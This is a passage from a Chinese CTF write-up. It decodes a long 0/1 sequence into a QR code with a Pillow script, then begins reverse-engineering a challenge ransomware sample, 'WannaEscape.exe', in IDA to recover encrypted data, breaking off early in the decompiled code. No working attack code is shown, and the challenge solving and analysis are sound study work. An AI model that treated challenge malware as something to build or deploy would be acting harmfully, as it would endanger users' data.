1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 </span><br><span class="line">1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 </span><br><span class="line">0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 </span><br><span class="line">0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 </span><br><span class="line">1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0</span><br><span class="line">0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1</span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 </span><br><span class="line">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br></pre></td></tr></table></figure></div>

<p>由于最后成功的提示是：”you can go furthur with ‘import image from PIL’” ，因此我以为这是某张图片的”字节数据”，所以研究了好久如何将文本数据的10直接塞到字节位中，后来发现不仅麻烦，而且这题也不是这个意思。</p>
<p><code>ios::binary</code> 以二进制文件格式打开文件，多种方式的连接：<code>ios::out | ios::binary</code> 。输入数据时指定数据地址的起点与大小，并源数据地址上的内容添加到目标地址。</p>
<p>在此吐槽一下字节数据问题，我发现实现文本的01直接原样化为二进制下字节各位的值居然这么困难…甚至找不到一些好的办法实现。最后的想法是利用python中的字符串转字节的快捷语法 <code>b&#39;str&#39;</code> ，通过C++将二进制数据转化为十六进制并添加前缀 <code>\x</code> 得到字符串输入python中转化为字节流实现，但是效果很不理想，而事实上本题也不是这个意思。虽然但是，这个确实很有说法，除了010editor中的脚本快捷输入外，是否还有别的办法将文本形态的01字节流直接转化为字节形态的数据呢？（文本的 <code>01</code> 的十六进制字节数据是两个字节的 <code>00 01</code> ）。PIL是Python2的版本，Python3已经更新为Pillow了。</p>
<p>只分黑白的成为二值图片，此处的01序列并非某张图片的字节数据，而是二值图的内容，将其整理成384*24的尺寸即可获得小半张二维码….网上只有用PIL将图片二值化的过程，没有逆过程，可能还是需要自己学习了PIL以后才能做到。因此选择直接将二值图放到txt中缩放各种尺寸，最后发现了半张二维码。</p>
<p>其实这里的尺寸不对，题目里提示：’二向箔的斑马’&#x3D;&gt;’二维马’（什么冷笑话）。考虑到二维码多为方形的，总像素点是9216&#x3D;96^2，所以如果真是二维码应该是96*96的。</p>
<h4 id="Python图像处理"><a href="#Python图像处理" class="headerlink" title="Python图像处理"></a>Python图像处理</h4><p>我没想到一道题能让我血压高两次…国内这个互联网环境真是抽象啊，为什么我找一个图像处理包的教程，几乎没有一个告诉我如何操作像素颜色的啊…真的很离谱，其中还有几个假文档…简单搜罗了很久很久很久，终于写出以下脚本用于还原二维码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=Image.new(<span class="string">&#x27;1&#x27;</span>,(<span class="number">96</span>,<span class="number">96</span>),<span class="number">1</span>)</span><br><span class="line">img_arr=img.load()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">        s=f.read(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            img_arr[i,j]=<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">f.close();</span><br><span class="line">img.save(<span class="string">&#x27;./233.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>简单整理一下相关知识点：</p>
<ol>
<li><p>用的是python3的Pillow包，一个图像处理包，python3的官方文档里莫得它，而且找不到完整的教程也找不到它自己的文档…（这应该是我自己的问题）</p>
</li>
<li><p>引入PIL包中的Image类，然后用 <code>new(mode,size,color)</code> 新建一张纯色图片，由于模式选的是’1’（必须有引号），所以是单色，颜色直接填写1即可，0是黑色，1是白色，而尺寸自然是96*96。</p>
</li>
<li><p>python中不需要任何包调用即可使用函数 <code>open(str,mode)</code> 打开文件，默认不加参数至少可以读… <code>r</code> 读方式打开，若文件不存在则报错；<code>w</code> 以写方式打开，文件存在则清空，不存在则创建；<code>b</code> 以二进制模式打开；<code>r+</code> 或 <code>w+</code> 以读写方式打开。最后别忘了关闭文件。</p>
</li>
<li><p>用 <code>file.read(size)</code> 函数读取指定个数的内容，并且指针向后推移。</p>
</li>
<li><p><code>type(s)</code> 返回s的类型；<code>range(95)</code> 返回0-94的所有整数，<code>range(3,5,2)</code> 只返回3，因为步长是2，而5是取不到的，该函数返回的实际上是一个整数列表；</p>
</li>
<li><p>用 <code>Image.load()</code> 函数加载对象的像素，可以用 <code>[a,b]</code> 访问a+1行b+1列的像素并修改它的值。</p>
</li>
<li><p>用函数 <code>.save(location)</code> 存储图片到指定位置。 </p>
</li>
<li><p>还有一个在很多教程都提到的 <code>lambda</code> ，用于快速创建一个函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="keyword">lambda</span> x:x+<span class="number">1</span> <span class="comment">#求x+1</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>还原后得到一张二维码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539739.jpg"
                     
                ></p>
<p>扫描后得到flag。</p>
<p>还有一篇用PIL将图片二值化的资料：<a class="link"   href="https://blog.csdn.net/weixin_45755831/article/details/122004205" >使用PIL库获取图片的二进制&#x2F;01文本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/58671158" >木头人-图像处理 Pillow库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://docs.python.org/zh-cn/3/" >没有Pillow包的中文Python3104文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_43790276/article/details/108478270" >Python的碎片-Python Pillow库的用法介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_40089648/article/details/89022804" >Python中lambda的用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_41496108/article/details/108680912" >欢天喜地小姐姐-range()函数用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/lly1122334/article/details/108218530" >XerCis-Python PIL和二进制图片互转 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/ShakalakaPHD/article/details/117729550" >Hurri_cane-Python中字节Byte数据与列表、十六进制转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/yqpy/p/8556090.html" >嶙羽-Python中StringIO和BytesIO <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_44159028/article/details/120388405" >山山而川’-Python 文件打开读取写入方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.osgeo.cn/pillow/handbook/index.html" >pillow小文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="骗！偷袭！勒索绑架！【任务A：数据恢复】"><a href="#骗！偷袭！勒索绑架！【任务A：数据恢复】" class="headerlink" title="骗！偷袭！勒索绑架！【任务A：数据恢复】"></a>骗！偷袭！勒索绑架！【任务A：数据恢复】</h3><p>题目给了两份文件，一份是”WannaEscape.exe”，也就是病毒程序，一份是”required_essay.txt.WannaEscape”。将exe程序拖进ida，在左侧找到main函数，然后F5恢复一下伪代码（这应该是C语言？）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 buf[<span class="number">1024</span>]; <span 